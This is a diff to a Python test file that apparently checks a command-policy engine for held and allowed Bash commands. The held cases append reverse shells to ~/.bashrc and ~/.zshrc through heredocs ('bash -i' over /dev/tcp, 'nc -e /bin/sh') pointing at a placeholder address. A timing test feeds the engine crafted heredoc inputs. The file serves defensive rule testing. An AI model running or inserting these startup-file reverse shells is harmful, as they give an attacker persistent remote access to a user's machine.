@@ -257,11 +257,16 @@ class CodingPack(unittest.TestCase):
                 "cat >> ~/.zshrc <<'EOF'\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.0.2.7:4444\nEOF",
                 "cat >> ~/.bashrc <<'EOF'\nexport FOO=bar\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF",
                 "tee -a ~/.bashrc <<'EOF'\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF",
-                "cat >> ~/.bashrc <<-'EOF'\n\tbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF")
+                "cat >> ~/.bashrc <<-'EOF'\n\tbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF",
+                # the heredoc before the write, as cat's own usage reads
+                "cat <<'EOF' >> ~/.bashrc\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF",
+                "cat << EOF > ~/.zshrc\nnc -e /bin/sh 192.0.2.7 4444\nEOF")
         benign = ("echo 'export PATH=$PATH:~/bin' >> ~/.bashrc", "crontab -l", "chmod 755 ./build.sh",
                   "chmod u+x deploy.sh", "id -u", "groups", "cat /etc/passwd", "echo 'alias ll=ls' >> ~/.bashrc",
                   "cat >> ~/.bashrc <<'EOF'\nexport PATH=$PATH:~/bin\nEOF",
-                  "cat >> notes.md <<'EOF'\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF")
+                  "cat <<'EOF' >> ~/.bashrc\nexport PATH=$PATH:~/bin\nEOF",
+                  "cat >> notes.md <<'EOF'\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF",
+                  "cat <<'EOF' >> notes.md\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF")
         new = {"TK-A011", "TK-A075", "TK-A076", "TK-A077", "TK-A078"}
         for pack, engine, e in self.every_pack():
             for command in held:
@@ -270,6 +275,17 @@ class CodingPack(unittest.TestCase):
             for command in benign:
                 with self.subTest(pack=pack, engine=engine, command=command):
                     self.assertFalse(new & set(e.decide("Bash", {"command": command})["rule_ids"]))
+
+    @pytest.mark.serial
+    def test_a_startup_file_heredoc_decides_in_time(self):
+        # #1075's heredoc reading, train 5: with the body's lines read from anywhere a `[^\n]{0,256}` header left off,
+        # heredoc heads within a line's last 256 characters spent the fallback engine's whole second
+        for command in ("tee -a .profile <<a " * 3250 + "\nnc -e",   # under 64 KiB each, which the policy reads
+                        "cat " + ">>~/.bashrc <<a " * 20 + "\n" + ("x" * 7900 + "\n") * 8,
+                        "cat <<a " * 4000 + ">>~/.bashrc\n" + "y " * 16000):
+            for pack, engine, e in self.every_pack():
+                with self.subTest(pack=pack, engine=engine, command=command[:20]):
+                    self.assertIsNone(e.decide("Bash", {"command": command}).get("nondeterministic"))
 
     def test_other_spellings_of_a_login_setuid_cron_or_network_shell_are_held(self):
         # the #752 review: each was allowed or only flagged; each rule's own id is asked for
